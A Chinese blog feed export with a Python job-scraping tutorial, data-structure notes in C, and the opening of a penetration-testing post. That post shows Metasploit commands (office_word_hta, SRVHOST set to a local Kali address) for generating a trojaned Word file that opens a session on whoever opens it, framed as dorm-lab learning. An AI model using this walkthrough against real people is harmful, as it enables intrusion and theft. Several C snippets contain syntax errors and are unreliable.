class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： 数据保存</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">file_path： 文件保存路径</span></span><br><span class="line"><span class="string">position_data： 职位数据</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span><span class="params">(self, file_path, position_data)</span>:</span></span><br><span class="line">df = pd.DataFrame([position_data])</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">df.to_csv(file_path, header=<span class="keyword">False</span>, index=<span class="keyword">False</span>, mode=<span class="string">"a+"</span>, encoding=<span class="string">"gbk"</span>)<span class="comment"># 数据转码并换行存储</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="keyword">for</span> page, index <span class="keyword">in</span> enumerate(range(<span class="number">287</span>)):</span><br><span class="line">print(<span class="string">"正在爬取第&#123;&#125;页的职位数据:"</span>.format(page+<span class="number">1</span>))</span><br><span class="line">tp = TencentPosition(start=(index*<span class="number">10</span>))</span><br><span class="line">tp_html = tp.get_page(url=tp.url, headers=tp.headers)</span><br><span class="line">tp.pyquery_analysis(html=tp_html)</span><br><span class="line">print(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>部分结果如下：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/d4628535e5dde7115832c220aaefce1b9c166100.jpg" width="500"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在本篇文章中，首先我们分别介绍了Beautiful Soup、XPath、pyquery的常见操作，之后通过使用该三种解析工具来爬取腾讯招聘网中所有的职位招聘数据，从而进一步让读者有一个更加深刻的认识。该案例中，由于本篇文章重点在于网站页面的解析方法，所以未使用多线程、多进程，爬取所有的数据爬取的时间在两分钟左右，在之后的文章中有时间的话会再次介绍多线程多进程的使用，案例中的解析方式都已介绍过，所以读者阅读源码即可。</p><font color="red">注意：本文章中所有的内容皆为在实际开发中常见的一些操作，并非所有，想要进一步提升等级的读者务必请阅读官方文档。</font><div style="text-align: right">2019-01-01,By Zero</div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;With the rapid development of the Internet，越来越多的信息充斥着各大网络平台。正如&lt;a href=&quot;https://baike.baidu.com/item/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0/25476?fr=aladdin&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《死亡笔记》&lt;/a&gt;中L·Lawliet这一角色所提到的&lt;a href=&quot;https://baike.baidu.com/item/大数定律/410082?fr=aladdin&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;大数定律&lt;/a&gt;，在众多繁杂的数据中必然存在着某种规律，偶然中必然包含着某种必然的发生。不管是我们提到的大数定律，还是最近火热的大数据亦或其他领域都离不开大量而又干净数据的支持，为此，网络爬虫能够满足我们的需求，即在互联网上按照我们的意愿来爬取我们任何想要得到的信息，以便我们分析出其中的必然规律，进而做出正确的决策。同样，在我们平时上网的过程中，无时无刻可见爬虫的影子，比如我们广为熟知的“度娘”就是其中一个大型而又名副其实的“蜘蛛王”（SPIDER KING）。而要想写出一个强大的爬虫程序，则离不开熟练的对各种网络页面的解析，这篇文章将给读者介绍如何在Python中使用各大解析工具。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://muzimz.cn/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Beautiful Soup" scheme="https://muzimz.cn/tags/Beautiful-Soup/"/>
    
      <category term="XPath" scheme="https://muzimz.cn/tags/XPath/"/>
    
      <category term="pyquery" scheme="https://muzimz.cn/tags/pyquery/"/>
    
  </entry>
  
  <entry>
    <title>数据结构学习笔记&lt;/center&gt;</title>
    <link href="https://muzimz.cn/2018/12/25/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://muzimz.cn/2018/12/25/数据结构学习笔记/</id>
    <published>2018-12-25T12:36:24.000Z</published>
    <updated>2020-02-21T02:57:34.313Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据结构学习笔记"><a href="#数据结构学习笔记" class="headerlink" title="数据结构学习笔记"></a><center>数据结构学习笔记</center></h1><p>①设计一个算法，将顺序表中的数据倒置</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void reverse(Sqlist &amp;L)</span><br><span class="line">&#123;</span><br><span class="line">int <span class="built_in">i</span>, <span class="built_in">j</span>;</span><br><span class="line">int temp;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">i</span> = <span class="number">0</span>, <span class="built_in">j</span> = L.<span class="built_in">length</span> - <span class="number">1</span>; <span class="built_in">i</span> &lt; <span class="built_in">j</span>; ++<span class="built_in">i</span>, --<span class="built_in">j</span>) &#123;</span><br><span class="line">temp = L.data[<span class="built_in">i</span>];</span><br><span class="line">L.data[<span class="built_in">i</span>] = L.data[<span class="built_in">j</span>];</span><br><span class="line">L.data[<span class="built_in">j</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>②删除顺序表中i到j的元素</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void delete(Sqlist &amp;L, int <span class="built_in">i</span>, int <span class="built_in">j</span>)</span><br><span class="line">&#123;</span><br><span class="line">int k;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="built_in">j</span> + <span class="number">1</span>; k &lt; L.<span class="built_in">length</span>; ++k) &#123;</span><br><span class="line">L.data[<span class="built_in">i</span>] = L.data[k];</span><br><span class="line">++<span class="built_in">i</span>;</span><br><span class="line">&#125;</span><br><span class="line">L.<span class="built_in">length</span> -= <span class="built_in">j</span> - <span class="built_in">i</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>③将大于和小于首元素的元素分别移至两边</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">void move(Sqlist &amp;L)</span><br><span class="line">&#123;</span><br><span class="line">int temp;</span><br><span class="line">int <span class="built_in">i</span> = <span class="number">0</span>, <span class="built_in">j</span> = L.<span class="built_in">length</span> - <span class="number">1</span>;</span><br><span class="line">temp = L.data[<span class="built_in">i</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">i</span> &lt; <span class="built_in">j</span>) &#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">i</span> &lt; <span class="built_in">j</span> &amp;&amp; temp &lt; L.data[<span class="built_in">j</span>]) --<span class="built_in">j</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">i</span> &lt; <span class="built_in">j</span>) &#123;</span><br><span class="line">L.data[<span class="built_in">i</span>] = L.data[<span class="built_in">j</span>];</span><br><span class="line">++<span class="built_in">i</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">i</span>&lt;<span class="built_in">j</span> &amp;&amp; temp&gt;L.data[<span class="built_in">i</span>]) ++<span class="built_in">i</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">i</span> &lt; <span class="built_in">j</span>) &#123;</span><br><span class="line">L.data[<span class="built_in">j</span>] = L.data[<span class="built_in">i</span>];</span><br><span class="line">--<span class="built_in">j</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">L.data[<span class="built_in">i</span>] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>④删除递增非空单链表中重复的元素</p><p>法一：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void delsl1(LNode *L)</span><br><span class="line">&#123;</span><br><span class="line">LNode *p, *q;</span><br><span class="line"><span class="function"><span class="title">p</span> = L-&gt;</span>next;</span><br><span class="line"><span class="function"><span class="title">while</span> (p-&gt;</span>next != NULL) &#123;</span><br><span class="line"><span class="function"><span class="title">if</span> (p-&gt;</span><span class="function"><span class="title">data</span> == p-&gt;</span><span class="function"><span class="title">next</span>-&gt;</span><span class="keyword">data</span>) &#123;</span><br><span class="line"><span class="function"><span class="title">q</span> = p-&gt;</span>next;</span><br><span class="line"><span class="function"><span class="title">p</span>-&gt;</span><span class="function"><span class="title">next</span> = q-&gt;</span>next;</span><br><span class="line">free(q);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="function"><span class="title">p</span> = p-&gt;</span>next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>法二：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void delsel2(Sqlist *L)</span><br><span class="line">&#123;</span><br><span class="line">LN<span class="function"><span class="title">ode</span> *p = L-&gt;</span><span class="function"><span class="title">next</span>, *q = p-&gt;</span>next, *r;</span><br><span class="line"><span class="function"><span class="title">while</span> (q != NULL &amp;&amp; p-&gt;</span><span class="function"><span class="title">data</span> == q-&gt;</span><span class="function"><span class="title">data</span>) q = q-&gt;</span>next;</span><br><span class="line"><span class="keyword">if</span> (q != NULL) &#123;</span><br><span class="line"><span class="function"><span class="title">p</span> = p-&gt;</span>next;</span><br><span class="line"><span class="function"><span class="title">p</span>-&gt;</span><span class="function"><span class="title">data</span> = q-&gt;</span><span class="keyword">data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">q</span> = p-&gt;</span>next;</span><br><span class="line"><span class="function"><span class="title">p</span>-&gt;</span>next = NULL;</span><br><span class="line">While(q != NULL) &#123;</span><br><span class="line">r = q;</span><br><span class="line"><span class="function"><span class="title">q</span> = q-&gt;</span>next;</span><br><span class="line">free(r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⑤删除链表中的最小值的节点</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">void delminnode(LNode *L)</span><br><span class="line">&#123;</span><br><span class="line">LN<span class="function"><span class="title">ode</span> *pre = L, *p = pre-&gt;</span>next, *minp = p, *minpre = pre;</span><br><span class="line"><span class="keyword">while</span> (p != NULL) &#123;</span><br><span class="line">pre = p;</span><br><span class="line"><span class="function"><span class="title">p</span> = p-&gt;</span>next;</span><br><span class="line"><span class="function"><span class="title">if</span> (minp-&gt;</span><span class="function"><span class="title">data</span> &gt; p-&gt;</span><span class="keyword">data</span>) &#123;</span><br><span class="line">minp = p;</span><br><span class="line">minpre = pre;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">minpre</span>-&gt;</span><span class="function"><span class="title">next</span> = minp-&gt;</span>next;</span><br><span class="line">free(minp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⑥尾插发逆置链表</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void reverse(LNode *L)</span><br><span class="line">&#123;</span><br><span class="line">LNode *p = L-&gt;<span class="keyword">next</span>, q;</span><br><span class="line">L-&gt;<span class="keyword">next</span> = NULL;</span><br><span class="line"><span class="keyword">while</span> (p != NULL) &#123;</span><br><span class="line">q = p-&gt;<span class="keyword">next</span>;</span><br><span class="line">p-&gt;<span class="keyword">next</span> = L-&gt;<span class="keyword">next</span>;</span><br><span class="line">L-&gt;<span class="keyword">next</span> = p;</span><br><span class="line">p = q;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⑦将一个链表分割成分别存有奇数和偶数的两个链表</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">void split(LNode *A, LNode *&amp;B)</span><br><span class="line">&#123;</span><br><span class="line">B = (LNode*)malloc(sizeof(LNode));</span><br><span class="line">B-&gt;<span class="keyword">next</span> = NUll;</span><br><span class="line">LNode *p, *q, *r;</span><br><span class="line">p = A;</span><br><span class="line">r = B;</span><br><span class="line"><span class="keyword">while</span> (p-&gt;<span class="keyword">next</span> != NULL) &#123;</span><br><span class="line">if (p-&gt;<span class="keyword">next</span>-&gt;data % == <span class="number">0</span>) &#123;</span><br><span class="line">q = p-&gt;<span class="keyword">next</span>;</span><br><span class="line">p-&gt;<span class="keyword">next</span> = q-&gt;<span class="keyword">next</span>;</span><br><span class="line">q-&gt;<span class="keyword">next</span>=NULL;</span><br><span class="line">r-&gt;<span class="keyword">next</span> = q;</span><br><span class="line">p = q;</span><br><span class="line">&#125;</span><br><span class="line">else p = p-&gt;<span class="keyword">next</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⑧逆序打印链表(递归)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reprint</span><span class="params">(LNode *L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (L != <span class="literal">NULL</span>) &#123;</span><br><span class="line">reprint(L-&gt;next);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; L - data &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⑧链表查找倒数第k个值</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="keyword">find</span>(LNode *head, <span class="keyword">int</span> k)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">p = head;</span><br><span class="line">q = head-&gt;<span class="keyword">next</span>;</span><br><span class="line"><span class="keyword">while</span> (q != <span class="keyword">NULL</span>) &#123;</span><br><span class="line">q = q-&gt;<span class="keyword">next</span>;</span><br><span class="line">++i;</span><br><span class="line"><span class="keyword">if</span> (i &gt; k) &#123;</span><br><span class="line">p = p-&gt;<span class="keyword">next</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (p == head) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">count</span> &lt;&lt; p-&gt;data;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⑨使序列{0，1，2，$\cdots n$}变成{p，$\cdots$ n，0，$\cdots$p-1}(逆置三次)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> R[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> temp;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = l, j = r; i &lt; j; ++i, --j) &#123;</span><br><span class="line">temp = R[i];</span><br><span class="line">R[i] = R[j];</span><br><span class="line">R[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RCR</span><span class="params">(<span class="keyword">int</span> R[], <span class="keyword">int</span> n, <span class="keyword">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (p &lt;= <span class="number">0</span> || p &gt;= n) <span class="built_in">cout</span> &lt;&lt; <span class="string">"eroor"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">reverse(R, <span class="number">0</span>, p - <span class="number">1</span>);</span><br><span class="line">reverse(R, p, n - <span class="number">1</span>);</span><br><span class="line">reverse(R, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⑩找到序列中数目是否含有大于$\frac{n}{2}$的数据</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> majority(<span class="keyword">int</span> A[], <span class="keyword">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i, <span class="keyword">count</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> temp;</span><br><span class="line">temp = A[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp == A[i]) ++<span class="keyword">count</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">count</span> &gt; <span class="number">0</span>) --<span class="keyword">count</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">temp = A[i];</span><br><span class="line"><span class="keyword">count</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">count</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="keyword">count</span> = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp == A[i]) ++<span class="keyword">count</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">count</span> &gt; n / <span class="number">2</span>) <span class="keyword">return</span> temp;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;数据结构学习笔记&quot;&gt;&lt;a href=&quot;#数据结构学习笔记&quot; class=&quot;headerlink&quot; title=&quot;数据结构学习笔记&quot;&gt;&lt;/a&gt;&lt;center&gt;数据结构学习笔记&lt;/center&gt;&lt;/h1&gt;&lt;p&gt;①设计一个算法，将顺序表中的数据倒置&lt;/p&gt;
&lt;figur
      
    
    </summary>
    
      <category term="笔记" scheme="https://muzimz.cn/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="https://muzimz.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>渗透攻击</title>
    <link href="https://muzimz.cn/2018/12/14/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB/"/>
    <id>https://muzimz.cn/2018/12/14/渗透攻击/</id>
    <published>2018-12-14T12:58:35.000Z</published>
    <updated>2019-03-29T06:05:09.462Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经有两个多月没有记录了，最近一直在忙于复习408、线代，还有kaggle的学习，原本打算暂时不再更新文章的，但是最近收到不少了类似像教务处通知、竞赛确认、务必查收等社工邮件亦或短信，是在是可恶至极，所以就再来水一篇文章吧。之后Zero搜索下相关新闻咨询，发现类似诈骗案件的报道还真不少，一大叠一大叠的层出不穷，令人遗憾的是有不少用户抵抗不了自己的好奇心从而咬住了攻击者的“鱼钩”，故而给对方有了可乘之机。<br><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/1.png" width="600"></p><p>Zero最近同样收到了不少这种邮件，比如昨天下午收到的这封：<br><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/2.png" width="600"></p><p>虽然类似这种现象很是常见，但是万变不离其宗，攻击者主要是利用社会工程学 + 人们对事物的好奇心理来实行攻击。你的兴趣爱好、个人情感甚至是你的某一篇朋友圈等信息对于他们来说就富含了极大的价值，他们往往能够从中洞察一些别样的信息，也许这些不起眼的信息正是他成功攻击的关键。</p><p>所以说，在日常生活中，加强我们的网络安全意识是有必要的，不要天真的以为这些离你还很远，等到来临的那一刻恐怕就为时已晚了。在之前的文章中，已经介绍了无线wifi的入侵，可见：<a href="https://jacklxj.github.io/2018/12/14/WIFI%E7%A0%B4%E8%A7%A3/" target="_blank" rel="noopener">Wifi破解</a><br>本文主要介绍以下一些常见的攻击手段，希望能对读者有所帮助：</p><ul><li>社工邮件</li><li>钓鱼网站</li><li>安卓渗透</li><li>短信诈骗</li></ul><a id="more"></a><h2 id="免责申明"><a href="#免责申明" class="headerlink" title="免责申明"></a>免责申明</h2><font color="red">任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文仅供学习，切勿用于非法操作，一切后果由使用者本人负责。（会坐牢的）</font><p><img src="http://ww2.sinaimg.cn/bmiddle/6af89bc8gw1f8nuikkysoj20k00k0abx.jpg"></p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>关于Kali Linux的下载安装，之前的文章已经有所介绍，这里就不再重述了。</p><ol><li>攻击机：Kali Linux</li><li>靶机：Windows 7，android</li><li>工具：Metasploit、setoolkit</li></ol><h2 id="社工邮件"><a href="#社工邮件" class="headerlink" title="社工邮件"></a>社工邮件</h2><p>在带有诈骗性的邮件中往往包含了钓鱼链接、木马文件之类的信息，主题中常常带有一些异奇描述，而这些描述则会带你落入圈套，博主不是很会描述，总之核心就是社会工程学。为了让大家理解其中的含义，下面拿诸葛建伟老师的<a href="https://baike.baidu.com/item/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/12350978?fr=aladdin" target="_blank" rel="noopener">《Metasploit渗透测试魔鬼训练营》</a>一书中的一个例子来说明下：<br><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/3.png" width="600"></p><p>看到没有，类似上图中的邮件内容，就是酱紫的。下面我们具体来介绍下实现的过程，这次使用的是<code>exploit/windows/fileformat/office_word_hta</code>模块来生成一个带有木马的<code>word</code>文件，目标打开该文件之后，将会在Kali终端获得目标的session，进而控制对方的设备并获取有价值得信息。</p><h3 id="木马文件的生成"><a href="#木马文件的生成" class="headerlink" title="木马文件的生成"></a>木马文件的生成</h3><ul><li>进入Metasploit终端<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msfconsole</span></span><br></pre></td></tr></table></figure></li></ul><p>执行之后，我们将进入<code>Metasploit</code>终端，如下图所示：<br><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/7.PNG" width="600"></p><ul><li>引入<code>exploit/windows/fileformat/office_word_hta</code>模块</li></ul><p>进入到<code>Metasploit</code>之后，通过之前的分析，我们是要生成一个木马文件来对选择的目标进行攻击，所以我们需要查询该Kali Linux系统中是否集成了所用模块，在本次我们拿<code>.doc</code>word文件来进行演示，为此执行如下命令：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">search office</span></span><br></pre></td></tr></table></figure></p><p>命令执行后显示如下：<br><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/8.PNG" width="600"></p><p>由上图我们可以发现，在对模块进行查找的过程中成功找到了三个模块，此次我们使用的是<code>exploit/windows/fileformat/office_word_hta</code>模块，执行以下命令来引入该命令：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/windows/fileformat/office_word_hta</span><br></pre></td></tr></table></figure></p><ul><li>参数设置</li></ul><p>引入模块之后，我们还需要查询该模块所需要的参数从而发动监听，命令如下：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">show options</span></span><br></pre></td></tr></table></figure></p><p><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/9.PNG" width="600"></p><p>通过上图，我们可以发现，所需要的参数主要有以下一些：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SRVHOST</span><span class="comment"># 攻击机的ip地址，即Kali Linux</span></span><br><span class="line">FIlENAME <span class="comment"># 自定义生成的文件名</span></span><br></pre></td></tr></table></figure></p><p>通过上述参数的讲解之后，我们对其进行一一设置，命令如下：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> SRVHOST <span class="number">192.168</span><span class="number">.31</span><span class="number">.103</span>  <span class="comment"># Kali的ip地址</span></span><br><span class="line"><span class="keyword">set</span> FILENAME    <span class="comment"># 自定义文件名</span></span><br><span class="line"><span class="comment"># 其他参数默认即可</span></span><br></pre></td></tr></table></figure></p><ul><li>执行渗透攻击模块<code>exploit</code></li></ul><p>在对参数进行设置之后，我们便能进一步执行<code>exploit</code>(或者<code>run</code>)开始渗透了<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/<span class="keyword">run</span><span class="bash"></span></span><br></pre></td></tr></table></figure></p><p>执行后的结果如下：<br><img 